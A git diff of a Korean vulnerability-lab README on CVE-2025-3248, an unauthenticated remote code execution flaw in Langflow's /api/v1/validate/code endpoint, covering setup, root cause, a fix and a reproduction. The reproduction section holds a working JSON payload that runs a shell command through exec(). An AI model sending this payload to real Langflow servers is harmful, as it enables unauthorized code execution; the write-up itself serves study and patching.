@@ -1,9 +1,9 @@
 # CVE-2025-3248 Langflow API 원격 코드 실행 취약점
 
 ### 1. 취약점 요약 
-Langflow의 /api/v1/validate/code 엔드포인트에서 발생하는 원격 코드 실행 취약점이다. 
-
-해당 취약점을 악용할 경우, 인증되지 않은 공격자가 서버에서 임의의 코드를 실행할 수 있다.
+Langflow는 AI 애플리케이션 구축 프레임워크로, 쉽게 워크플로우를 작성할 수 있는 오픈소스이다.
+Langflow 1.3.0 미만 버전에서 /api/v1/validate/code 엔드포인트의 사용자 인증 미흡으로 발생하는 원격 코드가 실행되는 취약점이다.
+CVSS 9.8로 매우 위험도가 높다.
 
 ### 2. 환경 구성 
 다음 명령어를 실행하면 취약한 환경구성과 poc.py까지 자동으로 실행된다.
@@ -12,11 +12,14 @@ docker compose up -d
 ```
 
 ### 3. 취약점 설명
-
-
-취약한 조건은 다음과 같다.
-- Langflow 버전이 1.3.0 미만
-- 인증되지 않은 사용자가 /api/v1/validate/code 엔드포인트에 접근 가능해야 함
+이 취약점은 Langflow 1.3.0 이전 버전에서 발생한다.
+![](./1.png)
+`/api/v1/validate/code`로 전달된 코드는 `post_validate_code()`에서 별도의 입력값 검증 없이 `validate_code()` 함수로 전달된다.
+![](./2.png)
+`validate_code()`함수는 입력값을 ast로 구조화하고 컴파일하여 `exec()`함수를 실행한다.
+즉, 인증 없는 사용자가 보낸 입력값이 검증없이 실행됨을 확인할 수 있다.
+![](./3.png)
+Langflow 1.3.0 버전부터는 `post_validate_code()`에 `CurrentActiveUser` 검증이 추가되어 유효한 사용자인지 확인하도록 패치되었다.
 
 ### 4. 재현 절차 
 `http://your-id:7860/api/v1/validate/code`에 POST 방식으로 다음과 같은 악의적인 요청을 보낸다.
@@ -38,7 +41,7 @@ Content-Length: 111
 {"code": "@exec(\"raise Exception(__import__('subprocess').check_output(['id']))\")\ndef foo():\n  pass"}
 
 ```
-![](./1.png)
+![](./4.png)
 ### 5. PoC 코드
 poc.py는 POST 요청으로 `/api/v1/validate/code` 엔드포인트에 악의적인 요청을 보낸다.
 ```
@@ -66,10 +69,10 @@ except requests.exceptions.JSONDecodeError:
 ```
 
 ### 6. 실행결과
-![](./2.png)
+![](./5.png)
 
 ### 7. 대응방안
-Langflow 1.3.0 이상의 버전으로 업데이트를 한다.
+현재 Langflow 1.3.0 이상의 버전으로 업데이트를 한다.
 
 ### 8. 참고자료
 - https://github.com/fDarkShadow/noctis/issues/186
